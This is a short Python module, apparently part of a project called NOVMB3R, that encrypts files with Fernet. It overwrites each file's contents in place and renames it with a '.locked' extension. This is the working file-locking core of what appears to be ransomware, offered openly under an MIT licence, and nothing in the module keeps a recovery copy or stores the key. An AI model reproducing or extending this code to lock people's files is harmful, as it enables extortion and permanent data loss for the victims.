#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# MIT License
#
# Copyright (c) 2024 Daniel Lima
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from pathlib import Path

from cryptography.fernet import Fernet


def gen_key() -> bytes:
    return Fernet.generate_key()


def get_fernet(key: str | bytes) -> Fernet:
    return Fernet(key)


def encrypt_bytes(fernet: Fernet, data: bytes) -> bytes:
    return fernet.encrypt(data)


def decrypt_bytes(fernet: Fernet, data: bytes) -> bytes:
    return fernet.decrypt(data)


def write_encrypted(file: Path, data: bytes) -> None:
    file.write_bytes(data)
    file.rename(file.with_name(file.name + ".locked"))


def encrypt_file(fernet: Fernet, file: Path) -> None:
    file_bytes = file.read_bytes()
    encrypted_bytes = encrypt_bytes(fernet, file_bytes)
    try:
        write_encrypted(file, encrypted_bytes)
    except (PermissionError, FileNotFoundError, IsADirectoryError):
        print(f"Skipping: {file}")


def encrypt_files(fernet: Fernet, files: list[Path]) -> None:
    for file in files:
        encrypt_file(fernet, file)
